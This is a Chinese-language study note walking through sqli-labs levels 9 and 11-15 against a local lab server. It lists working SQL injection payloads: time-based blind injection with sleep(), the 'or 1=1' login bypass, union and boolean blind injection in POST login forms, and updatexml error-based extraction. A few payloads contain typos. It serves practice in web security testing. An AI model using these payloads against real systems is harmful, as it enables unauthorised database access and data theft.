less9

  • 从标题得知，less9<基于时间-单引号>,那这关明显是延迟注入了。

  • 闭合前一个单引号，构造的延迟注入语句。(延迟注入不贴图了，记录一下payload)

    # 数据库
http://192.168.5.135/sqli/less-9/?id=1%27 and if(ascii(substr(database(),1,1))=115,1,sleep()) --+ 	#判断数据库的第一位字符ascii是否为115，也就是字母s
http://192.168.5.135/sqli/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--+ 
# 判断数据库名第二个字符ascii是否为101，也就是e
通过多次替换substr()的第二个参数以及if的成立条件的到数据库名security
    # 查询security数据库里的数据表
http://192.168.5.135/sqli/Less-9/?id=1%27and If (ascii(substr((select table_name frominformation_schema.tables where table_schema='security'limit 0,1),1,1))=101,1,sleep(5))--+
通过select语句查询information_schema中的security数据库的第一个表名的第一个字符ascii是否等于101，也就是e，条件成立则sleep(5)
依此类推得到emalis
    # 查询security库的第二个表
查询语句与第一个表差不多，不过需要修改limit的值
http://192.168.5.135/sqli/Less-9/?id=1%27and If (ascii(substr((select table_name frominformation_schema.tables where table_schema='security'limit 1,1),1,1))=114,1,sleep(5))--+
猜测第二个表名的第一位ascii是否为114也就是r
依次类推得到referers

less11

  • 从less11开始url提交参数的方式由GET变成了POST。

  • POST和GET的区别(区别挺多的，这里记一下两个比较直观的)

    • GET是从服务器上获取数据，POST是向服务器提交数据
    • GET把参数包含在URL中，POST通过requests body提交参数

  • 提交参数后浏览器页面会发生变化，不方便截图。这里改用burpsuite来进行操作。

    • username输入asdf'密码 asdf在username后输入引号触发报错
    从图中可以看到报错信息多了个单引号
    • 尝试注释后面的引号，输入万能密码试一试，返回了登录信息
    asdf’ or 1=1 –+ 
    这里之所以能登录的原因是因为，当提交了username和password之后，形成的sql语句为
@$sql="SELECT username,password FROM users WHERE username = 'asdf'or'1=1 --+ and password = '$passwd'LIMIT0,1";
在--+ 后的内容被注释掉了，前面的or 1=1 恒成立，所以这条语句能执行成功
    • 尝试union注入， 可以看到显示的database为security
    username: asdf’ union select 1,database() –+
    passwd: asdf
    • 前面提到的GET型注入的payload都可以使用，这里不重复操作了

less12

  • less12和less11相似，不过是id参数处理上有一定不同

  • 输入双引号触发报错，从报错信息看到多了一个双引号和)说明这里的id进行了(“id”)处理

    username：asdf” passwd: asdf

  • 在补全双引号和反括号之后这里同样可以使用上面的payload

    username: asdf”) union select 1,version() –+ passwd:asdf

less13

  • 输入单引号进行报错

    username: admin’ passwd: asdf(随便输)

  • 看到报错信息为’) ,也就是后台对id进行了(‘id’) 处理

    输入正确的账号密码，发现没有提示登录信息，只返回了一个是否登录的凭据

  • 使用布尔盲注猜测数据库的第一位

    username: asdf’) and left(database(),1) > ‘a’ –+ passwd: asdf
    • 登录成功，接着可以不断对每一位进行测试，less5已经演示了，这里不重复了。
    • 不过有一个值得注意的是，在测试的时候可以使用二分法可以有效降低测试的次数

less14

  • 这关和less13相似，对id的处理把变成了”。

    username: admin” passwd: admin

  • 主要是熟悉盲注的操作，列一下payload

    username: admin’ and left(database())>’a’ –+ passwd: admin

  • 尝试updatexml()报错注入,可以看到通过XPATH报错方式返回了数据库版本号

    username: admin’ and updatexml(1,concat(0x7e,(select version()),0x7e),3) –+ passed: admin

less15

  • 这关没有错误提示，只能用延迟注入判断了
